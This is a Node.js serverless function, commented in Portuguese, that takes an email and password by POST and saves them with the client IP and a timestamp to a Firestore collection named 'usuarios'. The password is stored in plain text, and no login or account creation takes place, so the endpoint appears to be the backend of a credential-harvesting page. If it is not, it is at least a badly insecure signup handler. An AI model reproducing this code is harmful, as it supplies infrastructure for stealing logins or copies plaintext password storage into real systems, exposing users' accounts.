const { initializeApp, cert } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');

// Inicializa Firebase com as credenciais seguras (variáveis de ambiente)
let app;
if (!app) {
    app = initializeApp({
        credential: cert({
            projectId: process.env.FIREBASE_PROJECT_ID,
            clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
            privateKey: process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n'),
        })
    });
}

const db = getFirestore();

exports.handler = async (event) => {
    // Só aceita POST
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const { email, password } = JSON.parse(event.body);

        // Validação básica no servidor
        if (!email || !password) {
            return { statusCode: 400, body: JSON.stringify({ error: 'Dados inválidos' }) };
        }

        // Salva no Firestore
        await db.collection('usuarios').add({
            email: email,
            password: password,
            timestamp: new Date().toISOString(),
            ip: event.headers['x-forwarded-for'] || 'desconhecido'
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true })
        };

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Erro interno' })
        };
    }
};
